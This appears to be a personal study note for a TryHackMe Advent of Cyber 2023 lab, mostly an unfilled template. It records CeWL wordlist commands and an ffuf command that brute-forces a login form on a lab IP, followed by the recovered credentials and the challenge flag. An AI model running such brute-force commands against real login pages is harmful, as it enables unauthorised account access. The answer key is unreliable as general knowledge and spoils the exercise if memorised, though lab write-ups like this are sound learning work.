---
creation date: December 4th 2023 (10:25 pm)
last modified date: December 4th 2023 (10:25 pm)
aliases: []
tags: 🎌
---
 
Primary Categories: 
Secondary Categories:  
Links: 
# [[THM - AoC 2023 - [Day 4] Baby, it's CeWLd outside]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- [[Custom Wordlist Generator|CeWL]]

---

# Information Gathering
Scanned all TCP ports:
```bash

```

Enumerated open TCP ports:
```bash

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 


---

# Exploitation
## Name of the technique


---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Steps

1. Start by grabbing a password list using [[Custom Wordlist Generator|CeWL]]
```bash
cewl -d 2 -m 5 http://10.10.118.91/ -w password.list --with-numbers
```

2. Do the same for usernames on the team member page
```bash
cewl -d 0 -m 5 http://10.10.118.91/team.php -w usernames.list --lowercase
```

3. The task calls to use [[wfuzz]] but I decided to use [[ffuf]]
```bash
ffuf -w password.list:W1,usernames.list:W2 -X POST -d "username=W2&password=W1" -u http://10.10.118.91/login.php -t 150 -ac -H "Content-Type: application/x-www-form-urlencoded"
```

4. Flag located under Inbox -> `kevin@northpole.thm`



---

# Trophy & Loot

## Credentials
- Admin page
	- isaias : Happiness

## Scripts


## Task Answers

  
What is the correct username and password combination? Format username:password
```
isaias:Happiness
```

What is the flag?  
```
THM{m3rrY4nt4rct1crAft$}
```

If you enjoyed this task, feel free to check out the [Web Enumeration](https://tryhackme.com/room/webenumerationv2) room.
```
Submit
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


